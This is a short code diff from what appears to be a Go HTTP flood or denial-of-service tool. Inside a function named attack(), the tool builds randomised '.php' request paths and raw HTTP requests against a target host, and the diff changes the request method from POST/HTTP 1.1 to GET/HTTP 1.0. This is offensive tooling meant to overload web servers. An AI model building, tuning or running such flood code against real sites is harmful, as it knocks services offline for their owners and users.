@@ -104,7 +104,7 @@ func attack() {
 		if rpath == true {
 			path = "/" + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + string(a_z[rand.Intn(len(a_z))]) + ".php"
 		}
-		get_host := "POST " + path + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		get_host := "GET " + path + " HTTP/1.0\r\nHost: " + addr + "\r\n"
 		request := get_host + header
 		if port == "443" {
 			cfg := &tls.Config{
